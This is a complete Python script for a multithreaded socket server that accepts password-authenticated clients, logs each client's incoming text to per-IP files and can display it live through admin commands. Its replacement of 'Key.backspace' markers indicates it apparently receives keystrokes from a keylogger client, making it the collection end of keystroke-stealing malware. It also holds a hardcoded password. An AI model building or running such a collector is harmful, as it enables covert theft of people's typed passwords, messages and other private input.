#!/usr/bin/python3

import socket
import threading
import time
import datetime
import os

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
PASSWORD = 'BuzzKill5678'

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(ADDR)


def admin_commands():
    global show
    while True:
        query = input('')
        
        query = query.upper()
        
        if query == 'ACTIVE CONNECTIONS' or query == 'AC':
            print('[ACTIVE CONNECTIONS]', threading.activeCount() - 2)
            
        elif query == 'CURRENT CONNECTIONS' or query == 'CC':
            if len(thread_address) != 0:
                print('[CURRENT CONNECTIONS]:')
                for i in range(len(thread_address)):
                    print(thread_address[i])
                    
            else:
                print('[NO CURRENT CONNECTIONS]')
                
        elif query == 'SHOW INCOMING' or query == 'SI':
            show = True
            print('[SHOWING INCOMING]')
            
        elif query == 'HIDE INCOMING' or query == 'HI':
            show = False
            print('[HIDING INCOMING]')
                
        else:
            print('[ERROR] Unrecognised command.')


def handle_client(conn, addr):
    now = datetime.datetime.now()
    print(f'[NEW CONNECTION] {addr[0]} connected at {now.strftime("%d/%m/%Y")} {now.strftime("%H:%M")}.')
    attempt = conn.recv(HEADER).decode(FORMAT)
    client_file_dir = os.path.dirname(os.path.realpath(__file__)) + '//Client info//' + f'log [{str(addr[0])}].txt'

    try:
        client_file = open(client_file_dir, 'a')
    except FileNotFoundError:
        client_file = open(client_file_dir, 'w')
    finally:
        read_file = open(client_file_dir, 'r')

    content = read_file.read()
    read_file.close()
    
    if len(content) == 0:
        client_file.write(str(now.strftime("%d/%m/%Y")) + ' ' + str(now.strftime("%H:%M")) + ':\n')
        client_file.close()
    else:
        client_file.write('\n' + str(now.strftime("%d/%m/%Y")) + ' ' + str(now.strftime("%H:%M")) + ':\n')
        client_file.close()
        
    thread_address.append(addr[0])

    if attempt == PASSWORD:
        try:
            connected = True
            while connected:
                client_file = open(client_file_dir, 'a')
                msg = conn.recv(HEADER).decode(FORMAT)
                
                msg = str(msg).replace('Key.backspace', '\b')
                client_file.write(msg)
                
                if show:
                    print('[CLIENT', str(addr[0]) + ']' + ':')
                    print(msg)
                
        except ConnectionResetError:
            conn.close()
            client_file.close()
            print('[DISCONNECTED]', addr[0], 'at', str(now.strftime("%d/%m/%Y")) + ' ' + str(now.strftime("%H:%M")) + '.')
            print('[ACTIVE CONNECTIONS]', threading.activeCount() - 3)
    else:
        conn.close()
        print('[ACTIVE CONNECTIONS]', threading.activeCount() - 3)
    
    thread_address.remove(addr[0])
    client_file.close()
    conn.close()


def start():
    global thread_address, show
    thread_address = []
    show = True
    server.listen(5)
    print('[LISTENING] Server is listening on', SERVER)

    thread = threading.Thread(target=admin_commands, args=())
    thread.start()

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        time.sleep(0.1)
        print('[ACTIVE CONNECTIONS]', threading.activeCount() - 2)


print('[SERVER] Server is starting...')
start()
